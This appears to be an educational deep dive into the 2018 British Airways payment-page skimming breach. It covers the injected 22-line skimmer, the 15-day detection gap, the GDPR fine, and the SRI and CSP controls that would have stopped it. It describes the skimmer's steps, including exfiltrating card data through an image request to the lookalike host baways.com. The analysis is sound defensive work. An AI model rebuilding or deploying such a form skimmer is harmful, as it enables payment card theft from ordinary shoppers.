British Airways Breach — Deep Dive

SUPPLY CHAIN XSS GDPR £20M FINE August 21 – September 5, 2018  |  ~500,000 customers  |  Discovered by RiskIQ

Anatomy of the Attack

The BA breach is the cleanest example of a supply chain XSS attack and the most consequential in terms of regulatory action. It is worth studying in detail because every element of it — the injection method, the exfiltration technique, the detection failure, and the regulatory outcome — illustrates a different layer of the web security threat model.

Step 1: Reconnaissance

Attackers identified that ba.com/booking (the payment page) loaded a JavaScript file from a CDN. The specific file was a Modernizr-adjacent utility script — not the core application code. Utility scripts are commonly overlooked in security audits because they are perceived as low-risk (no application logic).

Attackers also registered baways.com approximately two weeks before the attack — a lookalike domain for exfiltration.

Step 2: CDN Compromise

The exact method of CDN compromise has not been publicly confirmed. Possible vectors include: compromised CDN provider credentials, man-in-the-middle on a CDN update mechanism, or a separate vulnerability in the CDN infrastructure. The end result was that the attackers gained write access to the JS file served to ba.com.

Step 3: Skimmer Injection

22 lines were appended to the legitimate utility script. The additions were designed to blend in with the surrounding code style. The skimmer:

  1. Waited for DOMContentLoaded
  2. Located the payment form using a stable selector ([name="paymentForm"])
  3. Registered a submit event listener
  4. On submit: read all payment fields (name, card number, expiry, CVV, email)
  5. Exfiltrated via new Image().src to https://baways.com/gateway/v1/cdn?[data]
  6. Did not cancel the form submission — the legitimate transaction proceeded

Step 4: 15 Days Undetected

The skimmer ran from August 21 to September 5 — 15 days. It was discovered by RiskIQ's researchers through routine monitoring of JS file changes on high-value e-commerce sites, not by BA's own security team.

Why 15 days? BA had no automated monitoring of the integrity of their deployed JS files. The modified file had the same URL and was served from the same CDN — it appeared identical to normal traffic. No CSP violation reports were generated (BA had no CSP). No anomalous outbound traffic alerts were triggered. The only detection signal was the content of the JS file itself — which was only examined externally.

Step 5: Discovery and Response

RiskIQ identified the compromise by diffing BA's JS files against their archived versions. They notified BA on September 5, 2018. BA took the payment flow offline, removed the compromised file, and notified the ICO within 72 hours (as required by GDPR Article 33).

GDPR Outcome

The ICO issued an intention to fine BA £183.39 million (approximately 1.5% of global annual turnover) — the largest GDPR fine at the time. After representations from BA (including COVID-19 impact on revenue and BA's cooperation with the investigation), the fine was reduced to £20 million.

The ICO's findings relevant to security practitioners:

  • BA had failed to implement appropriate technical measures to protect personal data (GDPR Article 25, 32)
  • Specifically cited: absence of SRI on third-party scripts, absence of CSP, absence of continuous integrity monitoring
  • The breach was preventable with standard controls that were available and known at the time

Technical Post-Mortem: What Would Have Stopped It

Subresource Integrity (would have prevented execution):

<script
  src="https://cdn.ba.com/modernizr-custom.js"
  integrity="sha256-[hash]"
  crossorigin="anonymous"></script>

<!-- Browser verifies file hash before executing.
     Modified file → hash mismatch → execution blocked. -->

CSP img-src (would have blocked exfiltration):

Content-Security-Policy: img-src 'self' https://static.ba.com;

The new Image().src = 'https://baways.com/...' call would generate a CSP violation and the request would be blocked.

CSP report-uri (would have detected anomaly):

Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri https://csp.ba.com/report;

Even in report-only mode, a violation when the skimmer tried to load an image from baways.com would have generated a report — providing a detection signal within minutes of the first skimmer execution.

Key takeaway for defenders: Report-only CSP mode is free, requires no testing, and cannot break your application. It provides detection for XSS and supply chain injection with zero risk. Any organisation processing payment card data should have CSP report-uri as a minimum baseline — well before enforcing CSP.

PhD-Level Observations

  1. Supply chain XSS attacks scale in a way that direct XSS does not. A single CDN compromise reaches every customer of every site using that CDN. The attack surface is not the target site's code — it's the entire dependency graph.
  2. SRI is the technically complete defence against supply chain JS injection. However, SRI adoption on the web remains low — a 2020 study found SRI used on fewer than 10% of script tags that include external resources.
  3. The 15-day detection gap highlights a monitoring gap in the industry: static asset integrity monitoring. Log-based and network-based monitoring catch runtime anomalies; file integrity monitoring catches static asset changes. These are different monitoring planes and both are needed.
  4. GDPR's "appropriate technical measures" standard is retrospective: it asks whether the measures were known and available at the time, not whether they were commonly deployed. SRI was standardised in 2016 and was known and available in 2018. This creates legal liability for organisations that knowingly skip standard security controls.
